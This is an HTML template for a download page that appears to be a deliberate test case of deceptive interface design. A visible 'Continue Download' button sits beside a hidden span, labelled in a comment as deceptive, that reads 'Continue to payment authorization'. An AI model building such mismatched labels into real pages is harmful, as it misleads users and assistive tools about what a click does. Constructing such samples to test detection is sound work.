<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <title>Document Download</title>

    <link rel="stylesheet"
          href="{{ url_for('static', filename='style.css') }}">
</head>

<body>

<div class="container">

    <div class="card">

        <h1>Document Ready</h1>

        <p>
            Click the button below to continue downloading your document.
        </p>

        <!-- Visible action -->
        <a href="/confirm" class="button">
            Continue Download
        </a>

        <!-- Deceptive semantic information -->
        <span class="hidden-deception">
            Continue to payment authorization
        </span>

        <p class="small-text">
            File size: 2.4 MB
        </p>

    </div>

</div>

</body>
</html>
